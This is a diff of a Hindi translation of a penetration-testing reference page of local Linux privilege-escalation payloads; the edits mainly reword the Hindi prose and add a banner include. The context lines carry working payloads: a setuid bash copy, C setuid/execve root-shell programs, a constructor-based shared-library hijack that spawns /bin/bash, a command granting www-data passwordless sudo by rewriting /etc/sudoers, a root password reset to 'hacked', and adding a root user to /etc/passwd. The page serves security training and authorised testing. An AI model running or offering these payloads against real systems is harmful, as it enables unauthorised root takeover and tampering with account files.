@@ -1,5 +1,7 @@
 # निष्पादित करने के लिए Payloads
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## Bash
 
 `bash -p` privileged mode सक्षम करता है: जब Bash अलग-अलग real और effective IDs के साथ शुरू होता है, तो यह effective ID को real ID पर रीसेट नहीं करता। परिणामी shell अभी भी caller के मौजूदा credentials पर निर्भर करता है।<sup>[[1]](#references)[[3]](#references)</sup>
@@ -9,7 +11,7 @@ cp /bin/bash /tmp/b && chmod +s /tmp/b
 ```
 ## C
 
-`setresuid` अनुमति होने पर वास्तविक, प्रभावी और saved IDs को बदलता है, जबकि `setuid` प्रभावी ID को बदलता है और privileged caller के लिए वास्तविक तथा saved IDs भी सेट कर सकता है। `execve` वर्तमान process image को अनुरोधित program से बदल देता है।<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> इन उदाहरणों में return-value checks शामिल नहीं हैं; UID 0 के लिए भी दोनों credential calls विफल हो सकते हैं।<sup>[[2]](#references)[[3]](#references)</sup>
+`setresuid` अनुमति होने पर real, effective और saved IDs को बदलता है, जबकि `setuid` effective ID को बदलता है और privileged caller के लिए real तथा saved IDs भी सेट कर सकता है। `execve` current process image को अनुरोधित program से replace करता है।<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> इन examples में return-value checks शामिल नहीं हैं; UID 0 के लिए भी दोनों credential calls fail हो सकती हैं।<sup>[[2]](#references)[[3]](#references)</sup>
 ```c
 //gcc payload.c -o payload
 int main(void){
@@ -46,20 +48,20 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## privileges बढ़ाने के लिए किसी file को overwrite करना
+## Privileges बढ़ाने के लिए किसी file को overwrite करना
 
 ### सामान्य files
 
-ये सामान्य local privilege-control files और interfaces हैं: `/etc/passwd` में seven-field account records संग्रहीत होते हैं, `/etc/shadow` में optional encrypted password data संग्रहीत होता है, `sudoers` sudo privileges और `NOPASSWD` जैसे tags को परिभाषित करता है, और Docker का default daemon endpoint `/var/run/docker.sock` पर Unix socket होता है; उस socket तक access मिलने से उसके host पर root-level control मिल सकता है।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>
+ये सामान्य local privilege-control files और interfaces हैं: `/etc/passwd` में seven-field account records store होते हैं, `/etc/shadow` में optional encrypted password data store होता है, `sudoers` sudo privileges और `NOPASSWD` जैसे tags define करता है, और Docker का default daemon endpoint `/var/run/docker.sock` पर Unix socket होता है; उस socket तक access मिलने से उसके host पर root-level control मिल सकता है।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>
 
-- password वाले user को _/etc/passwd_ में जोड़ें
+- Password के साथ user को _/etc/passwd_ में add करें
 - _/etc/shadow_ में password बदलें
-- _/etc/sudoers_ में user को sudoers में जोड़ें
-- docker socket के माध्यम से docker का दुरुपयोग करें, जो सामान्यतः _/run/docker.sock_ या _/var/run/docker.sock_ में होता है
+- _/etc/sudoers_ में user को sudoers में add करें
+- docker socket के माध्यम से Docker का abuse करें, जो आमतौर पर _/run/docker.sock_ या _/var/run/docker.sock_ में होता है
 
 ### किसी library को overwrite करना
 
-जाँचें कि binary किन shared libraries का उपयोग करती है; इस example में `ldd` के साथ `/bin/su` का निरीक्षण करें।<sup>[[9]](#references)</sup>
+Check करें कि कोई binary किन shared libraries का उपयोग करती है; इस example में `ldd` के साथ `/bin/su` का inspection करें।<sup>[[9]](#references)</sup>
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -73,7 +75,7 @@ libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 ```
 `ldd` shared-object dependencies की जानकारी देता है, जबकि dynamic linker runtime पर उन्हें load करने के लिए ELF metadata और अपने search rules का उपयोग करता है।<sup>[[9]](#references)[[10]](#references)</sup>
 
-किसी एक candidate का निरीक्षण करने के लिए, `objdump -T` का उपयोग करके `su` की dynamic symbol table प्रिंट करें और audit names के लिए filter करें।<sup>[[11]](#references)</sup>
+किसी एक candidate का निरीक्षण करने के लिए, `objdump -T` का उपयोग `su` की dynamic symbol table प्रिंट करने और audit names के लिए filter करने हेतु करें।<sup>[[11]](#references)</sup>
 ```bash
 objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_open
@@ -81,9 +83,9 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-`audit_open`, `audit_log_user_message`, और `audit_log_acct_message` libaudit functions हैं; इस output में `audit_fd` को `su` के `.bss` में परिभाषित data object के रूप में दिखाया गया है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> एक replacement library को loader द्वारा resolve किए जाने वाले undefined symbols के लिए compatible definitions export करनी चाहिए; mismatched function/data ABIs तब भी process को fail कर सकते हैं, जब उन symbols को relocate या call किया जाता है।<sup>[[10]](#references)[[11]](#references)</sup>
+`audit_open`, `audit_log_user_message`, और `audit_log_acct_message` libaudit functions हैं; इस output में `audit_fd` को `su` के `.bss` में परिभाषित data object के रूप में दिखाया गया है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> एक replacement library को उन undefined symbols के लिए compatible definitions export करनी होंगी जिन्हें loader resolve करता है; mismatched function/data ABIs तब भी process को fail कर सकते हैं जब वे symbols relocate या call किए जाते हैं।<sup>[[10]](#references)[[11]](#references)</sup>
 
-GCC का `constructor` attribute supported targets पर `main` से पहले `inject` को automatically call करवाता है।<sup>[[15]](#references)</sup>
+GCC का `constructor` attribute समर्थित targets पर `main` से पहले `inject` को automatically call करवाता है।<sup>[[15]](#references)</sup>
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -111,9 +113,9 @@ system("/bin/bash");
 
 क्या आप root से कुछ execute करवा सकते हैं?
 
-`sudoers` policy entries में `NOPASSWD` tag का उपयोग करता है, `chpasswd` standard input से `user:password` pairs पढ़ता है, और `/etc/passwd` सात colon-separated account fields का उपयोग करता है; निम्नलिखित examples यह मानते हैं कि संबंधित files उन्हें चलाने वाले process द्वारा writable हैं।<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>
+`sudoers` policy entries में `NOPASSWD` tag का उपयोग करता है, `chpasswd` standard input से `user:password` pairs पढ़ता है, और `/etc/passwd` सात colon-separated account fields का उपयोग करता है; निम्नलिखित examples मानते हैं कि संबंधित files उन्हें चलाने वाले process द्वारा writable हैं।<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>
 
-### **www-data से sudoers तक**
+### **www-data से sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
@@ -121,7 +123,7 @@ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### /etc/passwd में नया root user जोड़ें
+### `/etc/passwd` में नया root user जोड़ना
 
 अंतिम payload उस target पर निर्भर करता है जो generated `crypt` hash स्वीकार करता है: Debian का `mkpasswd -m sha-512`, SHA-512 crypt (`$6$`) पर मैप करता है, जबकि OpenSSL का `passwd -1 -salt`, MD5-आधारित BSD algorithm (`$1$`) का उपयोग करता है।<sup>[[17]](#references)[[18]](#references)</sup>
 ```bash
